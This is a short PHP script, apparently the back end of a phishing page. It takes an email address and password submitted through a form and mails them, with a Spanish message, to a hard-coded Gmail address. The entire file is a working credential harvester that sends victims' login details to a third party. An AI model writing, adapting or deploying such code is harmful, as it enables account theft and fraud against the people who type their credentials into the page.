<?php

$email = $_POST['email'];
$password = $_POST['password'];



$mensaje = "Este es el correo: ".$email." y la contraseña: ".$password;




$para = "ramosal583@gmail.com";
$asunto = "VAinitas de correo";

mail($para, $asunto, utf8_decode($mensaje) ,  );





?>